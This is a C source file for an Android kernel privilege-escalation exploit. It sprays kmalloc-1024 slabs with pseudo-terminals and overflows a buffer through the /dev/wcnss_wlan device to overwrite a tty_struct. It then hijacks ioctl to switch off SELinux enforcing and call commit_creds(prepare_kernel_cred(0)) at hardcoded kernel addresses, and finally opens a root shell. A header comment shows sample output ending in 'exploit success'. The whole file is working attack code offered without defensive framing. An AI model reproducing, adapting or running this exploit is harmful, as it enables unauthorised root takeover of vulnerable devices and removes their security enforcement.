/*
 *  Author: freener.gdx@gmail.com
 *  Date  : 2016.7
 *
 *	root@bacon:/data/local/tmp # ./exploit_tty                                     
 *	[+] Exploit Start...
 *	[+] Current UID : 0
 *	[+] Spreay Kmalloc-1024 Slub
 *	[+] Release a object in kmalloc-1024 slub
 *	[+] OverFlow the buffer
 *	[+] Try to get the control
 *	[+] exploit success
 *	root@bacon:/data/local/tmp # 
 */

#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <termios.h>
#include <linux/termios.h>
#include <unistd.h>

#define PHYS_OFFSET 0xC0000000
//#define PAGE_SIZE 0x1000

#define TTY_MAGIC 0x5401

#define ONEOFF_ALLOCS 100
#define UNLUCKLY_ONE  ONEOFF_ALLOCS-5

#define COMMIT_CREDS_ADDR (0xc01ee21c)
#define PREPARE_KERNEL_CREDS_ADDR (0xc01eea00)
#define PRINTK (0xc0d50ce4)
#define SELINUX_ENFORCING (0xC16A7070)

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);
typedef int __attribute__((regparm(3))) (* _printk)(const char *fmt, ...);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
_printk printk;

struct file {
    void *ops;
};

int __attribute__((regparm(3))) payload_ioctl( struct file* f, unsigned int a, unsigned long b)
{
    printk( "Come here with ioctl\n" );
    unsigned int *selinux_enforcing = (unsigned int*)SELINUX_ENFORCING;
    printk( "[+] SELINUX_ENFORCING = %d\n", *selinux_enforcing );
    *selinux_enforcing = 0;
    printk( "[+] SELINUX_ENFORCING = %d\n", *selinux_enforcing );
    commit_creds( prepare_kernel_cred(0) );
    printk( "[+] Shellcode Down\n" );
    return -1;
}

struct device;
struct tty_driver;
struct tty_operations;

typedef struct {
    int counter;
} atomic_t;

struct kref {
    atomic_t refcount;
};

struct tty_struct_header {
    int magic;
    struct kref kref;
    struct device *dev;
    struct tty_driver *driver;
    const struct tty_operations *ops;
} overwrite;


int openpty(int* master, int* slave, char* name ) {
  *master = getpt();
  if (*master == -1) {
    return -1;
  }

  if (grantpt(*master) == -1 || unlockpt(*master) == -1) {
    close(*master);
    return -1;
  }

  char buf[32];
  if (name == NULL) {
    name = buf;
  }
  if (ptsname_r(*master, name, sizeof(buf)) != 0) {
    close(*master);
    return -1;
  }

  *slave = open(name, O_RDWR|O_NOCTTY);
  if (*slave == -1) {
    close(*master);
    return -1;
  }

  return 0;
}

unsigned long get_symbol(char *target_name) {
    FILE *f;
    unsigned long addr;
    char dummy;
    char name[256];
    int ret = 0;

    f = fopen("/proc/kallsyms", "r");
    if (f == NULL)
        return 0;

    while (ret != EOF) {
        ret = fscanf(f, "%p %c %s\n", (void **)&addr, &dummy, name);
        if (ret == 0) {
            fscanf(f, "%s\n", name);
            continue;
        }

        if (!strcmp(name, target_name)) {
            printf("[+] Resolved %s: %p\n", target_name, (void *)addr);

            fclose(f);
            return addr;
        }
    }

    printf("[-] Couldn't resolve \"%s\"\n", name);

    fclose(f);
    return 0;
}


int main() {
    char scratch[1024] = {0};
    void *tty_operations[64];
    int i, temp_fd_1, temp_fd_2;
    int ptm_fds[ONEOFF_ALLOCS];
    int pts_fds[ONEOFF_ALLOCS];

    for (i = 0; i < 64; ++i)
        tty_operations[i] = (void *)payload_ioctl;

    printf( "[+] Exploit Start...\n" );
    printf( "[+] Current UID : %d\n", getuid() );
    /*
    puts("[+] Resolving symbols");

    commit_creds = (commit_creds_fn)get_symbol("commit_creds");
    prepare_kernel_cred = (prepare_kernel_cred_fn)get_symbol("prepare_kernel_cred");
    if (!commit_creds || !prepare_kernel_cred) {
        printf( "[-] Can not resolve symbols\n" );
        return 1;
    } 
    */

    commit_creds = (_commit_creds)COMMIT_CREDS_ADDR;
    prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CREDS_ADDR;
    printk = (_printk)PRINTK;

    printf( "[+] Spreay Kmalloc-1024 Slub\n" );
    for (i = 0; i < ONEOFF_ALLOCS; ++i) {
        if (openpty(&ptm_fds[i], &pts_fds[i], NULL) == -1) {
            puts("[-] pty creation failed");
            return 1;
        }
    }


    int fd_wlan;
    fd_wlan = open( "/dev/wcnss_wlan", O_RDWR | O_NOCTTY );
    if ( fd_wlan < 0 ) {
        printf( "[-] Can not open /dev/wcnss_wlan\n" );
        return -1;
    }

    char *buffer1 = NULL;
    int message1_len = 1024 - 4 +  28 ;
    buffer1 = (char *)malloc( message1_len + 4 );
    if ( buffer1 == NULL ) {
        printf("[-] Failed to create message\n" );
        return -1;
    }
    memset( buffer1, 0, message1_len+4 );

    int length = 1024;
    *(unsigned int *)buffer1 = length;
    *(unsigned int *)(buffer1 + length )     = TTY_MAGIC;
    *(unsigned int *)(buffer1 + length + 4)  = 0xDEADBEEF;
    *(unsigned int *)(buffer1 + length + 8)  = (unsigned int)scratch;
    *(unsigned int *)(buffer1 + length + 12) = (unsigned int)scratch;
    *(unsigned int *)(buffer1 + length + 16) = (unsigned int)tty_operations;

    int count = 0;

    printf( "[+] Release a object in kmalloc-1024 slub\n" );
    close( ptm_fds[UNLUCKLY_ONE] );
    close( pts_fds[UNLUCKLY_ONE] );

    printf( "[+] OverFlow the buffer\n" );
    count = write( fd_wlan, buffer1, message1_len + 4 );
    
    printf( "[+] Try to get the control\n" );
    //ioctl( ptm_fds[UNLUCKLY_ONE] + 1 , 0xdeadbddf );
    ioctl( pts_fds[UNLUCKLY_ONE +1], 0xdeadbeef );

    if ( getuid() == 0 ) {
        printf( "[+] exploit success\n" );
        execl( "/system/bin/sh", "/system/bin/sh", NULL );
    }
    
    printf( "[-] ROOT Faild !!!\n" );
}
